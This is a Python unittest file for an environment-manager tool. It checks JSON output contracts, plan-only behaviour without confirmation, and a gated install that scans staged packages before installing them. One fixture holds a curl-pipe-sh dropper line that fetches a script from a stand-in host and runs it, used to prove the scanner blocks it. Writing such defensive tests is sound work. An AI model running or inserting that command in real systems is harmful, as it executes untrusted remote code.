#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Francesco Pelizza
"""test_envmgr.py — exercise envmgr.py's read-only verbs end to end.

Each test runs the verb as a SUBPROCESS (the same way the bridge will), asserts that
stdout is EXACTLY ONE JSON object with the contract keys, and that human logs went to
stderr (never stdout). Stdlib unittest only — runnable after a plain checkout.
"""
from __future__ import annotations

import json
import subprocess
import sys
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
ENVMGR = HERE / "envmgr.py"


def run_verb(*args: str) -> tuple[dict, str, int]:
    """Run `python3 envmgr.py <args>`; return (parsed_stdout_object, stderr, exitcode)."""
    proc = subprocess.run(
        [sys.executable, str(ENVMGR), *args],
        capture_output=True, text=True, timeout=180,
    )
    out = proc.stdout.strip()
    # stdout must be exactly one JSON object — parse the whole thing.
    lines = [ln for ln in out.splitlines() if ln.strip()]
    assert len(lines) == 1, f"expected ONE stdout line, got {len(lines)}: {out!r}"
    obj = json.loads(lines[0])
    return obj, proc.stderr, proc.returncode


class EnvmgrReadOnlyTests(unittest.TestCase):
    def _assert_envelope(self, obj: dict, command: str) -> None:
        self.assertIn("ok", obj)
        self.assertIn("command", obj)
        self.assertEqual(obj["command"], command)
        self.assertTrue(obj["ok"], msg=f"verb failed: {obj.get('error')}")

    def test_env_list(self) -> None:
        obj, _stderr, code = run_verb("env.list")
        self._assert_envelope(obj, "env.list")
        self.assertEqual(code, 0)
        self.assertIn("environments", obj)
        self.assertIsInstance(obj["environments"], list)
        self.assertEqual(obj["count"], len(obj["environments"]))
        self.assertIn("conda_available", obj)
        # system interpreter must always be present
        kinds = {e["kind"] for e in obj["environments"]}
        self.assertIn("system", kinds)
        for e in obj["environments"]:
            for k in ("name", "path", "kind", "python_version", "packages_count"):
                self.assertIn(k, e)

    def test_conda_env_list(self) -> None:
        obj, _stderr, code = run_verb("conda.env-list")
        self._assert_envelope(obj, "conda.env-list")
        self.assertEqual(code, 0)
        self.assertIn("conda_available", obj)
        self.assertIsInstance(obj["environments"], list)
        self.assertEqual(obj["count"], len(obj["environments"]))

    def test_cuda_info(self) -> None:
        obj, _stderr, code = run_verb("cuda.info")
        self._assert_envelope(obj, "cuda.info")
        self.assertEqual(code, 0)
        for k in ("gpu", "driver", "cuda_version", "nvidia_smi", "nvcc", "torch_cuda", "available"):
            self.assertIn(k, obj)
        self.assertIsInstance(obj["nvidia_smi"], bool)
        self.assertIsInstance(obj["available"], bool)

    def test_template_list(self) -> None:
        obj, _stderr, code = run_verb("template.list")
        self._assert_envelope(obj, "template.list")
        self.assertEqual(code, 0)
        self.assertGreaterEqual(obj["count"], 1)
        self.assertEqual(obj["count"], len(obj["templates"]))
        for t in obj["templates"]:
            self.assertIn("id", t)
            self.assertIn("label", t)

    def test_pkg_list_system(self) -> None:
        # pip list against the system interpreter; pip should be present in CI/dev.
        obj, _stderr, code = run_verb("pkg.list", "system")
        self._assert_envelope(obj, "pkg.list")
        self.assertEqual(code, 0)
        self.assertIsInstance(obj["packages"], list)
        self.assertEqual(obj["count"], len(obj["packages"]))

    def test_unknown_verb_fails_closed(self) -> None:
        obj, _stderr, code = run_verb("does.not.exist")
        self.assertFalse(obj["ok"])
        self.assertIn("error", obj)
        self.assertEqual(code, 2)

    def test_no_verb_fails_closed(self) -> None:
        obj, _stderr, code = run_verb()
        self.assertFalse(obj["ok"])
        self.assertIn("error", obj)
        self.assertEqual(code, 2)

    def test_mutating_verb_without_confirm_is_a_plan(self) -> None:
        # pkg.install without --confirm must NOT execute; it returns a plan.
        obj, _stderr, code = run_verb("pkg.install", "system", "definitely-not-a-real-pkg-xyz")
        self._assert_envelope(obj, "pkg.install")
        self.assertTrue(obj.get("planned"))
        self.assertNotIn("executed", obj)
        self.assertIn("plan", obj)
        self.assertEqual(code, 0)


# --------------------------------------------------------------------------- #
# file 04 §6 — the GATED INSTALL SPINE: stage → REAL nemesis → gated install.
# These import envmgr directly and drive nemesis on LOCAL dirs (no network, no
# package installs). The download step is stubbed to plant bytes into the real
# staging dir so the REAL scanner decides — we never reach out to PyPI.
# --------------------------------------------------------------------------- #
import contextlib  # noqa: E402
import io  # noqa: E402
import os  # noqa: E402
import subprocess  # noqa: E402
import tempfile  # noqa: E402

sys.path.insert(0, str(HERE))
import envmgr  # noqa: E402


def _capture(fn, *a, **k) -> dict:
    """Run a verb fn that calls emit/fail once; return the parsed stdout object."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        fn(*a, **k)
    lines = [ln for ln in buf.getvalue().splitlines() if ln.strip()]
    return json.loads(lines[-1])


# A tiny benign tree and a curl|sh dropper — what nemesis scans in these tests.
_BENIGN = "print('hello, world')\n"
_MALICIOUS = 'import os\nos.system("curl http://evil.example/x.sh | sh")\n'


class GateSpineTests(unittest.TestCase):
    """The non-negotiable spine: nothing is fetched/executed without the gate (§6)."""

    ENV = {"name": "spine-test", "path": "/tmp/__nonexistent_spine_env__", "kind": "venv"}

    def _stub_download(self, payload: str, install_sink: list):
        """Return a subprocess.run stub: download plants `payload`, install is recorded."""
        real = subprocess.run

        def stub(cmd, *a, **k):
            cmd_l = list(cmd)
            if "download" in cmd_l:
                dest = cmd_l[cmd_l.index("--dest") + 1]
                (Path(dest) / "setup.py").write_text(payload, encoding="utf-8")

                class R:
                    returncode = 0
                    stdout = ""
                    stderr = ""

                return R()
            if "install" in cmd_l and "--no-index" in cmd_l:
                install_sink.append(" ".join(map(str, cmd_l)))

                class R:
                    returncode = 0
                    stdout = "installed"
                    stderr = ""

                return R()
            return real(cmd, *a, **k)

        return stub

    def test_benign_artifact_installs_from_staging(self) -> None:
        installs: list = []
        with mock_run(self._stub_download(_BENIGN, installs)):
            obj = _capture(envmgr._gate_install, "pkg.install", self.ENV, ["benign"],
                           confirmed=True, force=False)
        self.assertTrue(obj["ok"])
        self.assertTrue(obj["installed"])
        self.assertEqual(obj["verdict"], "allow")
        # installed the EXACT vetted bytes — via --no-index --find-links <staging>.
        self.assertEqual(len(installs), 1)
        self.assertIn("--no-index", installs[0])
        self.assertIn("--find-links", installs[0])

    def test_malicious_artifact_is_blocked_and_not_installed(self) -> None:
        installs: list = []
        with mock_run(self._stub_download(_MALICIOUS, installs)):
            obj = _capture(envmgr._gate_install, "pkg.install", self.ENV, ["evil==1.0"],
                           confirmed=True, force=False)
        # §8 blocked envelope — fail-closed, NOTHING installed.
        self.assertFalse(obj["ok"])
        self.assertTrue(obj["blocked"])
        self.assertEqual(obj["gate"]["verdict"], "block")
        self.assertIn("request", obj)
        self.assertEqual(installs, [], "a BLOCK verdict must never install")

    def test_force_overrides_block_and_flags_forced_danger(self) -> None:
        installs: list = []
        with mock_run(self._stub_download(_MALICIOUS, installs)):
            obj = _capture(envmgr._gate_install, "pkg.install", self.ENV, ["evil==1.0"],
                           confirmed=True, force=True)
        self.assertTrue(obj["ok"])
        self.assertTrue(obj["installed"])
        self.assertIn("forced_danger", obj)
        self.assertEqual(obj["forced_danger"]["verdict"], "block")
        self.assertEqual(len(installs), 1, "force MUST install the vetted bytes")

    def test_nemesis_gate_failclosed_when_scanner_missing(self) -> None:
        # No binary resolvable anywhere ⇒ synthetic ERROR verdict (BLOCK).
        original = envmgr._find_nemesis
        try:
            envmgr._find_nemesis = lambda: None  # type: ignore[assignment]
            v = envmgr.nemesis_gate("/tmp")
        finally:
            envmgr._find_nemesis = original  # type: ignore[assignment]
        self.assertEqual(v["verdict"], "error")
        self.assertEqual(v["exit_code"], 2)
        self.assertFalse(v["safe_to"]["install"])

    def test_nemesis_gate_failclosed_on_missing_target(self) -> None:
        # The real scanner on a non-existent path ⇒ error verdict, fail-closed.
        v = envmgr.nemesis_gate("/tmp/__definitely_not_here_envmgr_xyz__")
        self.assertEqual(v["verdict"], "error")

    def test_install_without_confirm_never_stages_or_scans(self) -> None:
        # A plan must run NO subprocess at all (no download, no scan, no install).
        ran: list = []

        def trip(cmd, *a, **k):
            ran.append(cmd)
            raise AssertionError("no subprocess may run before --confirm")

        with mock_run(trip):
            obj = _capture(envmgr._gate_install, "pkg.install", self.ENV, ["six"],
                           confirmed=False, force=False)
        self.assertTrue(obj["planned"])
        self.assertEqual(ran, [])
        # the plan exposes the literal stage→scan→install argv for GUI preview.
        self.assertIn("download", obj["plan"])
        self.assertIn("gate", obj["plan"])
        self.assertIn("install", obj["plan"])


@contextlib.contextmanager
def mock_run(fn):
    """Swap subprocess.run for the duration of the block (no external test deps)."""
    original = subprocess.run
    envmgr.subprocess.run = fn  # type: ignore[assignment]
    try:
        yield
    finally:
        envmgr.subprocess.run = original  # type: ignore[assignment]


class NewVerbsContractTests(unittest.TestCase):
    """Subprocess-level: new verbs emit ONE JSON object with the contract keys."""

    @classmethod
    def setUpClass(cls) -> None:
        cls.tmp = tempfile.mkdtemp(prefix="envmgr-newverb-")
        cls.venv = str(Path(cls.tmp) / "v")
        subprocess.run([sys.executable, "-m", "venv", cls.venv],
                       capture_output=True, text=True, timeout=120)

    @classmethod
    def tearDownClass(cls) -> None:
        import shutil
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_env_doctor(self) -> None:
        obj, _stderr, code = run_verb("env.doctor", self.venv)
        self.assertEqual(obj["command"], "env.doctor")
        self.assertTrue(obj["ok"])
        self.assertIn(obj["health"], ("ok", "degraded", "broken"))
        for k in ("interpreter_runs", "pip_resolves", "config_parses", "cuda_visible"):
            self.assertIn(k, obj["checks"])
        self.assertEqual(code, 0)

    def test_env_export_freeze(self) -> None:
        obj, _stderr, code = run_verb("env.export", self.venv)
        self.assertEqual(obj["command"], "env.export")
        self.assertTrue(obj["ok"])
        self.assertEqual(obj["format"], "requirements.txt")
        self.assertIsInstance(obj["requirements"], list)
        self.assertEqual(obj["count"], len(obj["requirements"]))
        self.assertEqual(code, 0)

    def test_pkg_upgrade_without_confirm_is_a_plan_or_uptodate(self) -> None:
        obj, _stderr, code = run_verb("pkg.upgrade", self.venv, "pip")
        self.assertEqual(obj["command"], "pkg.upgrade")
        self.assertTrue(obj["ok"])
        # explicit spec given → a gated plan (no execute without --confirm).
        self.assertTrue(obj.get("planned"))
        self.assertNotIn("executed", obj)
        self.assertEqual(code, 0)

    def test_template_commit_without_confirm_is_a_plan(self) -> None:
        obj, _stderr, code = run_verb(
            "template.commit", "--template", "data-science", "--env", self.venv)
        self.assertEqual(obj["command"], "template.commit")
        self.assertTrue(obj["ok"])
        self.assertTrue(obj.get("planned"))
        self.assertIn("plan", obj)
        self.assertEqual(code, 0)

    def test_cuda_torch_without_confirm_is_a_plan(self) -> None:
        obj, _stderr, code = run_verb("cuda.torch", "--env", self.venv)
        self.assertEqual(obj["command"], "cuda.torch")
        self.assertTrue(obj["ok"])
        self.assertTrue(obj.get("planned"))
        self.assertEqual(code, 0)

    def test_pkg_disable_enable_roundtrip(self) -> None:
        # plant a fake dist-info, disable (sentinel rename), then re-enable.
        py = Path(self.venv) / "bin" / "python3"
        sp = subprocess.run(
            [str(py), "-c", "import site;print(site.getsitepackages()[0])"],
            capture_output=True, text=True, timeout=30).stdout.strip()
        dinfo = Path(sp) / "marker_pkg-9.9.dist-info"
        dinfo.mkdir(parents=True, exist_ok=True)
        (dinfo / "METADATA").write_text("Name: marker-pkg\nVersion: 9.9\n", encoding="utf-8")

        obj, _stderr, code = run_verb("pkg.disable", self.venv, "marker-pkg", "--confirm")
        self.assertTrue(obj["ok"], msg=obj.get("error"))
        self.assertEqual(obj["state"], "disabled")
        self.assertTrue(obj["disabled_marker"].endswith(".studio-disabled"))
        self.assertFalse(dinfo.exists())  # renamed away

        obj2, _stderr2, _code2 = run_verb("pkg.enable", self.venv, "marker-pkg", "--confirm")
        self.assertTrue(obj2["ok"], msg=obj2.get("error"))
        self.assertEqual(obj2["state"], "enabled")
        self.assertTrue(dinfo.exists())  # restored

    def test_env_import_missing_file_fails_closed(self) -> None:
        obj, _stderr, code = run_verb(
            "env.import", "--file", "/tmp/__no_such_reqs__.txt", "--name", "x")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)

    def test_pkg_remove_without_confirm_is_a_plan(self) -> None:
        obj, _stderr, code = run_verb("pkg.remove", self.venv, "pip")
        self.assertEqual(obj["command"], "pkg.remove")
        self.assertTrue(obj.get("planned"))
        self.assertEqual(code, 0)

    def test_env_clone_without_confirm_is_a_gated_plan(self) -> None:
        dest = str(Path(self.tmp) / "clone")
        obj, _stderr, code = run_verb("env.clone", self.venv, dest)
        self.assertEqual(obj["command"], "env.clone")
        self.assertTrue(obj.get("planned"))
        # the clone reinstall is GATED: the plan declares stage→scan→install, not a
        # raw `pip install` (no un-gated reinstall path).
        self.assertIn("gate_and_install", obj["plan"])
        self.assertEqual(code, 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
